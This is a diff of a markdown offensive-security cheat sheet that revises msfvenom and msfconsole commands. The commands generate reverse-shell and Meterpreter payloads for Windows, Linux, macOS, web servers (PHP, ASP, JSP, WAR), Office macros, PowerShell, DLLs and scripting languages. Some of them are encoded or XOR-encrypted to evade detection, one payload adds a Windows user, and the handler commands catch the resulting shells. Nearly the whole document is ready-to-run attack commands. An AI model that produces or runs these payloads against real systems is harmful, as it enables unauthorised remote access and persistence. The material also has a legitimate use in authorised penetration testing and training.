@@ -4,175 +4,172 @@
 
 #plateform/linux #target/local #cat/ATTACK/REVERSE_SHELL 
 
-## msfvenom payloads list
+## msfvenom - List available payloads
 ```
-msfvenom --list payloads
-```
-
-## msfvenom - payload windows x86 meterpeter unstagged
-```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
+msfvenom --list-options payload
 ```
 
-## Linux Meterpreter Reverse Shell
+## msfvenom - Windows x86 Meterpreter Reverse TCP (unstaged)
 ```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
-```
-
-## Linux x64 Meterpreter Reverse tcp
-```
-msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o shell.exe
 ```
 
-## Windows Meterpreter Reverse TCP Shell
+## msfvenom - Linux x86 Meterpreter Reverse TCP
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
-```
-
-## Windows Reverse TCP Shell
-```
-msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe > shell.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
 ```
 
-## Windows Encoded Meterpreter Windows Reverse Shell
+## msfvenom - Linux x64 Meterpreter Reverse TCP
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e shikata_ga_nai -i 3 -f exe > encoded.exe
-```
-
-## Mac Reverse Shell
-```
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho > shell.macho
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip|tun0> LPORT=<port> PrependFork=true -f elf -o test.elf
 ```
 
-## meterpreter x64 - https - non staged
+## msfvenom - Windows Meterpreter Reverse TCP (staged)
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
+```
+
+## msfvenom - Windows Shell Reverse TCP
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<local> -f exe -o shell.exe
+```
+
+## msfvenom - Windows Meterpreter Reverse TCP (encoded)
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<local> -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe
+```
+
+## msfvenom - macOS x86 Shell Reverse TCP
+```
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o shell.macho
+```
+
+## msfvenom - Windows x64 Meterpreter Reverse HTTPS (non-staged)
 ```
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfnonstaged.exe
 ```
 
-## meterpreter x64 - https - staged
+## msfvenom - Windows x64 Meterpreter Reverse HTTPS (staged)
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f exe -o /var/www/html/msfstaged.exe
 ```
 
 ## Web Payloads
 
-## PHP Meterpreter Reverse TCP
+## msfvenom - PHP Meterpreter Reverse TCP
 ```
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.php
-```
-
-## ASP Meterpreter Reverse TCP
-```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > shell.asp
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php
 ```
 
-## JSP Java Meterpreter Reverse TCP
+## msfvenom - ASP Meterpreter Reverse TCP
 ```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > shell.jsp
-```
-
-## WAR
-```
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war > shell.war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp
 ```
 
-## VBA 32bits
+## msfvenom - JSP Java Meterpreter Reverse TCP
 ```
-msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vbapplication
-```
-
-## powershell 32 bits
-```
-msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp
 ```
 
-## DLL
+## msfvenom - WAR Payload
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o <dll|output.dll>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
+```
+
+## msfvenom - VBA 32-bit Meterpreter Reverse HTTPS
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f vba -o shell.vba
+```
+
+## msfvenom - PowerShell 32-bit Meterpreter Reverse HTTPS
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f psh -o shell.ps1
+```
+
+## msfvenom - DLL Payload (Windows x64 Meterpreter Reverse HTTPS)
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> -f dll -o output.dll
 ```
 
 # Scripting Payloads
 
-## Python Reverse Shell
+## msfvenom - Python Reverse Shell
 ```
-msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw > shell.py
-```
-
-## Bash Unix Reverse Shell
-```
-msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw -o shell.py
 ```
 
-## Perl Unix Reverse shell
+## msfvenom - Bash Unix Reverse Shell
 ```
-msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw > shell.pl
-```
-
-## Powershell
-```
-msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1
+msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw -o shell.sh
 ```
 
-## Csharp - xor encrypted
+## msfvenom - Perl Unix Reverse Shell
 ```
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp
+msfvenom -p cmd/unix/reverse_perl LHOST=<ip> LPORT=<port> -f raw -o shell.pl
+```
+
+## msfvenom - PowerShell Reverse HTTPS
+```
+msfvenom -p windows/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> EXITFUNC=thread -f ps1 -o shell.ps1
+```
+
+## msfvenom - Csharp (xor encrypted)
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port|443> --encrypt xor --encrypt-key <key> -f csharp -o shell.cs
 ```
 
 # msfvenom Shellcode
 
-## Windows Meterpreter Reverse TCP Shellcode
+## msfvenom - Windows Meterpreter Reverse TCP Shellcode
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
-```
-
-## Linux Meterpreter Reverse TCP Shellcode
-```
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
 ```
 
-## Mac Reverse TCP Shellcode
+## msfvenom - Linux Meterpreter Reverse TCP Shellcode
 ```
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language>
-```
-
-# msfvenom create user 
-
-## MCreate User
-```
-msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe > adduser.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
 ```
 
-# msfvenom Handler
+## msfvenom - macOS Reverse TCP Shellcode
+```
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f <language> -o shellcode.<ext>
+```
 
-## Metasploit Handler windows tcp 32bits staged
+# msfvenom - Create User Payload
+
+## msfvenom - Windows Add User Payload
+```
+msfvenom -p windows/adduser USER=<user|hacker> PASS='<pass|Hacker123$>' -f exe -o adduser.exe
+```
+
+# Metasploit Handler
+
+## Metasploit Handler - Windows TCP 32-bit (staged)
 ```
 msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
 ```
 
-## Metasploit Handler windows https 32bits staged
+## Metasploit Handler - Windows HTTPS 32-bit (staged)
 ```
-msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
+msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit"
 ```
 
-## Metasploit Handler windows https 64bits staged
+## Metasploit Handler - Windows HTTPS 64-bit (staged)
 ```
 msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
 ```
 
-## Metasploit - Handler windows https 64bits unstaged
+## Metasploit Handler - Windows HTTPS 64-bit (unstaged)
 ```
 msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
 ```
 
-## Metasploit - Handler windows https 64bits stagged - encoded xor
-others encoder : x64/zutto_dekiru
-
+## Metasploit Handler - Windows HTTPS 64-bit (staged, encoded xor)
 ```
 msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
 ```
 
-## Metasploit - Handler linux tcp 64bits stagged - encoded xor
+## Metasploit Handler - Linux TCP 64-bit (staged, encoded xor)
 ```
-msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
+msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload linux/x64/meterpreter/reverse_tcp; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
 ```
-
